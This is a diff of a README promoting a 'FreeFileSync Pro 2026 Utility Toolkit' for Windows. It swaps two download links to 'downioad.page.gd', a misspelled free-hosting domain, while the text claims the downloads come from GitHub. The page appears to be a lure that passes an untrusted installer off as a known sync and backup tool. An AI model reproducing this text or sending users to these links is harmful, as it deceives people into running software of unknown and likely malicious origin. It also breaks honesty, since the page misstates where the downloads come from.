@@ -2,7 +2,7 @@
 
 FreeFileSync Pro 2026 Utility Toolkit is a comprehensive desktop application designed for Windows users who demand reliable and efficient file synchronization and backup solutions. This tool provides a streamlined approach to managing file comparisons, real-time synchronization, and automated backup tasks — all wrapped in an intuitive interface that makes complex data management simple.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -66,7 +66,7 @@ Yes, the FreeFileSync Pro 2026 Utility Toolkit offers a portable mode that allow
 
 To get started, download the latest version using the link below:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ## Support & Feedback
 
